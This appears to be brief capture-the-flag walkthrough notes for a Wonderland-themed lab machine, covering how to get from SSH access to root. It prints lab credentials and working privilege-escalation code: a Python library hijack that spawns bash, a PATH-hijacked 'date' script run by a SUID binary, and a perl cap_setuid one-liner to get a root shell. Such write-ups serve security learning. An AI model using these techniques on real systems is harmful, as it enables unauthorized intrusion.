start with nmap

http ssh open.

/r/a/b/b/i/t

in source code found.

`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

ssh in.

alice can run `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as rabbit user.

walrus_and_the_carpenter.py use random. we can create random.py in currunt direcoty. add python script in it.

```python3
import os
os.system("/bin/bash")

```

privs esca to rabbit.

rabbit --hatter

rabbit home dir has teaparty exe file with suid bit enable.

this will use date cmd. 

add /tmp to PATH.

creaete date exec

```bash
#!/bin/bash

/bin/bash

```

exec teaparty. it will exe our date file .

get hatter user.	

in hatter home dir found password : `WhyIsARavenLikeAWritingDesk?`

hatter has cap_suid bit set for perl

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

get root.